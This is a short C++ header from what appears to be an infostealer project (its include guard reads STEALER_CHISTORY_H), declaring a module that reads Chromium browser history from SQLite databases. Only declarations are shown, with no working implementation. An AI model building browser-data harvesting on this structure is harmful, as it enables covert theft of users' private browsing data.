//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CHISTORY_H
#define STEALER_CHISTORY_H


#include "sqlite3.h"
#include "../ChromiumBrowserModule.h"

class CHistory : public ChromiumBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
private:
    static std::list<History> getHistory(const fs::path &db_path);
};


#endif //STEALER_CHISTORY_H
